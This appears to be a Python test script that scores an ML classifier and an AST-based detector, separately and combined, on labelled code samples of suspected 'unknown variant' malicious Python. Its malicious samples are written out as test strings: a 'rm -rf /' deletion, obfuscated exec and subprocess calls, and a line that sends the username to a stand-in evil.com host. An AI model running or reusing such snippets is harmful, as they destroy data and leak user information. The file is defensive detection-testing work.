#!/usr/bin/env python3
"""Round 24 - 未知变体测试 (简化版)"""

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

from round24.integration.ml_classifier import MLClassifier
from round16.ast_detector_v2 import ASTDetectorV2

# 加载模型
models_dir = Path(__file__).parent.parent / 'round24' / 'ml' / 'models'
model_path = str(max(models_dir.glob('*.pkl')))

ml = MLClassifier(model_path)
ast = ASTDetectorV2()

print("=" * 70)
print("🧪 未知变体检测测试")
print("=" * 70)

tests = [
    # (名称，代码，期望：True=恶意，False=安全)
    ("已知攻击", "import os; os.system('rm -rf /')", True),
    ("未知变体 - 动态导入", "import importlib; os=importlib.import_module('os'); os.system('id')", True),
    ("未知变体 - 反射调用", "import builtins; exec=getattr(builtins,'exec'); exec('import socket')", True),
    ("混淆 - 多层 Base64", "import base64; exec(base64.b64decode(base64.b64decode('WkdzYkdWdVpHVnM=')))", True),
    ("混淆 - 十六进制", "import subprocess; subprocess.run(bytes.fromhex('77686f616d69').decode(), shell=True)", True),
    ("0-day - 数据外传", "import urllib.request,getpass,socket; urllib.request.urlopen('http://evil.com/'+getpass.getuser())", True),
    ("安全样本", "def add(a,b): return a+b; print(add(1,2))", False),
    ("安全样本 - 文件操作", "import json; f=open('config.json'); data=json.load(f); f.close()", False),
]

results = {'ast': {'correct': 0, 'total': 0}, 'ml': {'correct': 0, 'total': 0}, 'fusion': {'correct': 0, 'total': 0}}

print()
for name, code, expected in tests:
    ml_pred, ml_conf, _ = ml.predict(code, 'python')
    ast_result = ast.analyze_code(code, 'test.py')
    
    # 融合决策
    trad_score = 1.0 if ast_result.is_malicious else 0.0
    ml_score = ml_conf if ml_pred else 0.0
    fusion_score = 0.6 * trad_score + 0.4 * ml_score
    fusion_pred = fusion_score >= 0.5
    
    # 统计
    for method, pred in [('ast', ast_result.is_malicious), ('ml', ml_pred), ('fusion', fusion_pred)]:
        results[method]['total'] += 1
        if pred == expected:
            results[method]['correct'] += 1
    
    status = "✅" if fusion_pred == expected else "❌"
    print(f"{status} {name}")
    print(f"   期望：{'恶意' if expected else '安全'}, AST: {'恶意' if ast_result.is_malicious else '安全'}, ML: {'恶意' if ml_pred else '安全'}, 融合：{'恶意' if fusion_pred else '安全'}")

print("\n" + "=" * 70)
print("📊 结果汇总")
print("=" * 70)
for method in ['ast', 'ml', 'fusion']:
    acc = results[method]['correct'] / results[method]['total'] * 100
    print(f"{method.upper():<10}: {results[method]['correct']}/{results[method]['total']} ({acc:.1f}%)")
print("=" * 70)
